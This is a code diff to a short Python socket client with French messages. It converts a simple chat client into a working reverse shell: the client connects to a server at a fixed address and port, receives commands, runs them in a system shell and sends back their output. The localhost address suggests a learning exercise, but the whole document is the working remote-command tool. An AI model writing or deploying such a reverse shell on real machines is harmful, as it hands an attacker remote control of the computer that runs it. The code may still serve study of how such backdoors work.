@@ -1,17 +1,31 @@
 import socket
+import subprocess
 
 ip_address = '127.0.0.1'
 port_number = 1234
 
-cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-cs.connect((ip_address, port_number))
+def connect_to_server():
+    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    cs.connect((ip_address, port_number))
+    print("Connecté au serveur :)")
 
-msg = input("Ecris un message :")
+    while True:
+        try:
+            command = cs.recv(1024).decode()
+            if command.lower() == 'quit':
+                break
 
-while msg != 'quit':
-    cs.send(msg.encode())
-    msg = cs.recv(1024).decode()
-    print(msg)
-    msg = input("Enter msg to send :")
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
 
-cs.close()
+            output = result.stdout + result.stderr
+            if not output:
+                output = "Commande executée, pas de sortie !."
+            cs.send(output.encode())
+        except Exception as e:
+            cs.send(f"Error: {e}".encode())
+            break
+
+    cs.close()
+
+if __name__ == "__main__":
+    connect_to_server()
